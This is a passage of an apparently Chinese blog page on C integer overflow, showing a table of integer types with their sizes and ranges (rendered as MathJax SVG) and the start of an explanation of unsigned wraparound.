63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></td>
</tr>
<tr>
<td align="center">无符号整型</td>
<td align="center">unsigned int</td>
<td align="center">4</td>
<td align="center">0~<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="8.576ex" height="2.452ex" role="img" focusable="false" viewBox="0 -833.9 3790.6 1083.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msup" transform="translate(389,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"></path></g></g></g><g data-mml-node="mo" transform="translate(1901.3,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(2901.6,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(3401.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></td>
</tr>
<tr>
<td align="center">长整型</td>
<td align="center">long</td>
<td align="center">4</td>
<td align="center"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="4.679ex" height="2.072ex" role="img" focusable="false" viewBox="0 -833.9 2068.1 915.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="msup" transform="translate(778,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(500,0)"></path></g></g></g></g></g></svg></mjx-container>~<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="8.576ex" height="2.452ex" role="img" focusable="false" viewBox="0 -833.9 3790.6 1083.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msup" transform="translate(389,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(500,0)"></path></g></g></g><g data-mml-node="mo" transform="translate(1901.3,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(2901.6,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(3401.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></td>
</tr>
<tr>
<td align="center">无符号长整型</td>
<td align="center">unsigned long</td>
<td align="center">4</td>
<td align="center">0~<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="8.576ex" height="2.452ex" role="img" focusable="false" viewBox="0 -833.9 3790.6 1083.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msup" transform="translate(389,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z" transform="translate(500,0)"></path></g></g></g><g data-mml-node="mo" transform="translate(1901.3,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(2901.6,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(3401.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></td>
</tr>
<tr>
<td align="center">64位整型</td>
<td align="center">long long</td>
<td align="center">8</td>
<td align="center"><mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="4.679ex" height="2.072ex" role="img" focusable="false" viewBox="0 -833.9 2068.1 915.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="msup" transform="translate(778,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z"></path><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z" transform="translate(500,0)"></path></g></g></g></g></g></svg></mjx-container>~<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="8.576ex" height="2.452ex" role="img" focusable="false" viewBox="0 -833.9 3790.6 1083.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="msup" transform="translate(389,0)"><g data-mml-node="mn"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="TeXAtom" transform="translate(533,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z"></path><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z" transform="translate(500,0)"></path></g></g></g><g data-mml-node="mo" transform="translate(1901.3,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(2901.6,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(3401.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container></td>
</tr>
</tbody></table>
<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><h2 id="上溢"><a href="#上溢" class="headerlink" title="上溢"></a>上溢</h2><p>一个整数通过运算(赋值)，超过它能表示的上限，则会变成一个很小的数；</p>
<ul>
<li><p>无符号</p>
<ul>
<li>  一个unsigned short类型的变量<code>a=65535</code>，当a累加5时会变成4；</li>
<li>  这是因为在计算机中，$$(65535)<em>{10}+(5)</em>{10}=(1111111111111111)_2+(101)_2=(10000000000000100)_2<mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.464ex;" xmlns="http://www.w3.org/2000/svg" width="92.514ex" height="2.161ex" role="img" focusable="false" viewBox="0 -750 40891 955"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">，</text></g><g data-mml-node="mi" transform="translate(1000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">而</text></g><g data-mml-node="mi" transform="translate(2000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">由</text></g><g data-mml-node="mi" transform="translate(3000,0)"><text data-variant="normal" transform="scale(1,-1)" font-size="884px" font-family="serif">于</text></g><g data-mml-node="mi" transform="translate(4000,0)"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(4572,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(5172,0)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mi" transform="translate(5641,0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(5986,0)"><path data-c="1D454" d="M311 43Q296 30 267 15T206 0Q143 0 105 45T66 160Q66 265 143 353T314 442Q361 442 401 394L404 398Q406 401 409 404T418 412T431 419T447 422Q461 422 470 413T480 394Q480 379 423 152T363 -80Q345 -134 286 -169T151 -205Q10 -205 10 -137Q10 -111 28 -91T74 -71Q89 -71 102 -80T116 -111Q116 -121 114 -130T107 -144T99 -154T92 -162L90 -164H91Q101 -167 151 -167Q189 -167 211 -155Q234 -144 254 -122T282 -75Q288 -56 298 -13Q311 35 311 43ZM384 328L380 339Q377 350 375 354T369 368T359 382T346 393T328 402T306 405Q262 405 221 352Q191 313 171 233T151 117Q151 38 213 38Q269 38 323 108L331 118L384 328Z"></path></g><g data-mml-node="mi" transform="translate(6463,0)"><path data-c="1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(7063,0)"><path data-c="1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path></g><g data-mml-node="mi" transform="translate(7529,0)"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="mi" transform="translate(8049,0)"><path data-c="1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path></g><g data-mml-node="mi" transform="translate(8518,0)"><path data-c="210E" d="M137 683Q138 683 209 688T282 694Q294 694 294 685Q294 674 258 534Q220 386 220 383Q220 381 227 388Q288 442 357 442Q411 442 444 415T478 336Q478 285 440 178T402 50Q403 36 407 31T422 26Q450 26 474 56T513 138Q516 149 519 151T535 153Q555 153 555 145Q555 144 551 130Q535 71 500 33Q466 -10 419 -10H414Q367 -10 346 17T325 74Q325 90 361 192T398 345Q398 404 354 404H349Q266 404 205 306L198 293L164 158Q132 28 127 16Q114 -11 83 -11Q69 -11 59 -2T48 16Q48 30 121 320L195 616Q195 629 188 632T149 637H128Q122 643 122 645T124 664Q129 683 137 683Z"></path></g><g data-mml-node="mi" transform="translate(9094,0)"><path data-c="1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path></g><g data-mml-node="mi" transform="translate(9579,0)"><path data-c="1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mi" transform="translate(10030,0)"><path data-c="1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 